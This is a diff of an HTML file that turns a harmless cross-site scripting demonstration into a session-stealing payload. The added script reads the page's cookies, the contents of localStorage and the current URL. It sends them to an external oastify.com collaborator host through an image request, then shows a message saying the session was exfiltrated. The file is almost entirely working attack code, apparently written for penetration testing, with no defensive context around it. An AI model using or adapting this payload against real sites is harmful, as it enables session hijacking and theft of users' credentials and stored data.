@@ -1,5 +1,22 @@
 <html>                                                                                                                                                                                                           
+  <body>                                                                                                                                                                                                           
+  <h1 id="r">Stealing session...</h1>                                                                                                                                                                              
   <script>                                                                                                                                                                                                         
-  document.write('<h1>XSS: ' + document.domain + '</h1>');                                                                                                                                                         
+  // Grab cookies + localStorage                                                                                                                                                                                   
+  var data = 'cookie=' + encodeURIComponent(document.cookie);
+                                                                                                                                                                                                                   
+  // Try to access localStorage
+  try {                                                                                                                                                                                                            
+    data += '&ls=' + encodeURIComponent(JSON.stringify(localStorage));
+  } catch(e) {}                                                                                                                                                                                                    
+   
+  // App URL context                                                                                                                                                                                               
+  data += '&url=' + encodeURIComponent(location.href);
+                                                                                                                                                                                                                   
+  // Send to collaborator
+  new Image().src = 'https://g7ovwr3i1rsl02gnj9ctibo35ublzbn0.oastify.com/steal?' + data;                                                                                                                          
+                                                                                                                                                                                                                   
+  document.getElementById('r').innerText = 'Session exfiltrated to collaborator';                                                                                                                                  
   </script>                                                                                                                                                                                                        
+  </body>                                                                                                                                                                                                          
   </html>
